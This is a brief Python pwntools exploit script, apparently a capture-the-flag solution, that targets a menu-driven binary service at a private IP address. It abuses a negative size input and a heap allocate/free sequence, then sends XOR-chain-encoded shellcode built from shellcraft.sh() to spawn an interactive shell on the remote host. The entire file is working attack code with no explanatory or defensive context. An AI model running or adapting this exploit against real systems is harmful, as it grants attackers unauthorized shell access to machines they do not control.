from pwn import *
context.arch = 'amd64'
#io = process("./pwn")
io = remote('172.16.9.24',9017)

def sl(d):
	io.sendlineafter("> ",d)
def s(d):
	io.sendafter("> ",d)

s("fuckyouhhh")
sl("-65536")

sl("1")
sl(str(0x30))
s("AAAA")

sl("2")
sl("2")

sl("1")
sl(str(0x30))
s('\x90')

sl("1")
sl(str(0x30))
s('\x90')

sl("1")
sl(str(0x30))
s('The cake is a lie!\0')

sl("3")


ss = asm(shellcraft.sh())
print ss
arr = [ord(i) for i in ss]

for i in range(len(arr)-1,0,-1):
	arr[i-1] ^= arr[i] 

print arr

ff = "".join([chr(i) for i in arr])
#gdb.attach(io,'handle SIGALRM nostop noprint')
s(ff)

io.interactive()
